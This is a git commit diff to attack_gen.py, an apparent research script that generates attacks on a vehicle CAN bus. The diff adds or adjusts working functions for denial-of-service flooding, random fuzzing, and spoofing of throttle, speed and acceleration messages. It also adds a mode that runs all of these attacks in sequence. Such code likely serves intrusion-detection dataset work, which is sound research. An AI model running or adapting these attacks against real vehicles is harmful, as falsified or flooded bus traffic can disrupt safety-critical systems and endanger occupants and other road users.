f669b53f13536e276672a865a31105793c744171
fabiopapais <fabiopapais0@gmail.com>
2024-05-28 10:13:22 -0300

    New spoofing

--- attack_gen.py
+++ attack_gen.py
@@ -9,7 +9,7 @@ def send_message(arb_id=0x000, bytes=[0, 0, 0, 0, 0, 0, 0, 0]):
     """Sends a single message."""
     with bus:
         msg = can.Message(
-            arbitration_id=arb_id, data=bytes
+            arbitration_id=arb_id, data=bytes, is_extended_id=False
         )
         try:
             bus.send(msg)
@@ -23,7 +23,7 @@ def generate_random_bytes():
         bytes.append(random.randrange(0, 255))
     return bytes
 
-def dos_attack(interval=0.0002, duration=20):
+def dos_attack(interval=0.0002, duration=30):
     """Sends a strem of high-priority message."""
     print("Starting DoS Attack")
     for i in range(int(duration / interval)):
@@ -34,7 +34,7 @@ def dos_attack(interval=0.0002, duration=20):
         task.stop()
     print("Stopped DoS cyclic send")
 
-def fuzzy_attack(interval=0.003, duration=20):
+def fuzzy_attack(interval=0.003, duration=30):
     """Sends stream of random id and payload messages."""
     print("Starting Fuzzy Attack")
     for i in range(int(duration / interval)):
@@ -45,18 +45,29 @@ def fuzzy_attack(interval=0.003, duration=20):
         task.stop()
     print("Stopped Fuzzy attack")
 
-def throt_vehicspeed_spoofing(interval=0.001, duration=20):
-    """Sends falsified throttle and vehicle speed message."""
-    print("Starting Throttle and Vehicle Speed Spoofing")
+def throt_spoofing(interval=0.01, duration=30):
+    """Sends falsified throttle message."""
+    print("Starting Throttle Spoofing")
+    for i in range(int(duration / interval)):
+        msg = can.Message(arbitration_id=0x7E2, data=[00, 65, 17, 00, 00, 00, 00, 00], is_extended_id=False)
+        task = bus.send_periodic(msg, interval)
+        assert isinstance(task, can.CyclicSendTaskABC)
+        time.sleep(interval)
+        task.stop()
+    print("Stopped Throttle Spoofing")
+
+def speed_spoofing(interval=0.01, duration=30):
+    """Sends falsified throttle message."""
+    print("Starting Vehicle Speed Spoofing")
     for i in range(int(duration / interval)):
         msg = can.Message(arbitration_id=0x7E2, data=[00, 65, 13, 00, 00, 00, 00, 00], is_extended_id=False)
         task = bus.send_periodic(msg, interval)
         assert isinstance(task, can.CyclicSendTaskABC)
         time.sleep(interval)
         task.stop()
-    print("Stopped Throttle and Vehicle Speed Spoofing")
+    print("Stopped Vehicle Speed Spoofing")
 
-def acelleration_spoofing(interval=0.05, duration=20):
+def acelleration_spoofing(interval=0.01, duration=30):
     """Sends falsified acelleration response message."""
     print("Starting Acceleration Spoofing")
     for i in range(int(duration / interval)):
@@ -69,15 +80,37 @@ def acelleration_spoofing(interval=0.05, duration=20):
 
 if __name__ == "__main__":
     command = sys.argv[1]
-    duration = int(sys.argv[2])
 
-    if (command == "dos"):
-        dos_attack(duration=duration)
-    elif (command == "fuzzy"):
-        fuzzy_attack(duration=duration)
-    elif (command == "throt"):
-        throt_vehicspeed_spoofing(duration=duration)
-    elif (command == "accel"):
-        acelleration_spoofing(duration=duration)
+    if command == "serial_attack":
+        dos_attack()
+        fuzzy_attack()
+        throt_spoofing()
+        speed_spoofing()
+        acelleration_spoofing()
+
+    if len(sys.argv) > 3:
+        duration = int(sys.argv[2])
+        interval = int(sys.argv[3])
+        if (command == "dos"):
+            dos_attack(duration=duration, interval=interval)
+        elif (command == "fuzzy"):
+            fuzzy_attack(duration=duration, interval=interval)
+        elif (command == "throt"):
+            throt_spoofing(duration=duration, interval=interval)
+        elif (command == "speed"):
+            speed_spoofing(duration=duration, interval=interval)
+        elif (command == "accel"):
+            acelleration_spoofing(duration=duration, interval=interval)
+    else:
+        if (command == "dos"):
+            dos_attack()
+        elif (command == "fuzzy"):
+            fuzzy_attack()
+        elif (command == "throt"):
+            throt_spoofing()
+        elif (command == "speed"):
+            speed_spoofing()
+        elif (command == "accel"):
+            acelleration_spoofing()
 
     bus.shutdown()
